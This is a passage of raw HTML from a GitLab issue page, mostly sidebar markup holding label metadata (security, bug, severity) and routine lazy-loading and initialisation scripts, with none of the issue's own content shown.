group&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2023-04-19T18:09:26.707Z&quot;,&quot;updated_at&quot;:&quot;2024-07-16T10:09:03.108Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857529,&quot;title&quot;:&quot;priority::3&quot;,&quot;color&quot;:&quot;#fff600&quot;,&quot;description&quot;:&quot;We want to address this but may have other higher priority items. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:02:52.659Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:53.318Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713901,&quot;title&quot;:&quot;severity::3&quot;,&quot;color&quot;:&quot;#fff600&quot;,&quot;description&quot;:&quot;Major - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:22.464Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:27.359Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:28669354,&quot;title&quot;:&quot;workflow::complete&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Applied after all MRs have merged and the issue has been verified if necessary&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2023-01-12T00:18:59.592Z&quot;,&quot;updated_at&quot;:&quot;2023-01-12T17:27:43.939Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="407783" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="block" data-testid="iteration-container"><div class="js-sidebar-iteration-widget-root" data-can-edit="" data-group-path="gitlab-org" data-issue-id="126893846" data-issue-iid="407783" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="js-sidebar-weight-widget-root" data-can-edit="" data-issue-iid="407783" data-project-path="gitlab-org/gitlab"></div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<div class="js-sidebar-health-status-widget-root" data-can-edit="" data-full-path="gitlab-org/gitlab" data-iid="407783" data-issuable-type="issue"></div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="block">
<div class="hide-collapsed gl-flex gl-items-center gl-font-bold gl-leading-20 gl-text-default">
Confidentiality
</div>
<div class="hide-collapsed gl-text-subtle">
Confidentiality controls have moved to the issue actions menu (<svg class="s12 gl-align-middle" data-testid="ellipsis_v-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#ellipsis_v"></use></svg>) at the top of the page.
</div>
</div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/gitlab-org/gitlab/-/issues/407783.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/gitlab-org/gitlab/-/issues/407783/toggle_subscription","moveIssueEndpoint":"/gitlab-org/gitlab/-/issues/407783/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=278964","editable":"","currentUser":{},"rootPath":"/","fullPath":"gitlab-org/gitlab","iid":407783,"id":126893846,"severity":"unknown","timeTrackingLimitToHours":true,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false","weightOptions":["None","Any",0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20],"weightNoneValue":"None","multipleApprovalRulesAvailable":null}</script>
</div>
</aside>



</main>
</div>


</div>
</div>


<script nonce="GgHj/7PjWa0Ktiw7UigImA==">
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script nonce="GgHj/7PjWa0Ktiw7UigImA==">
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

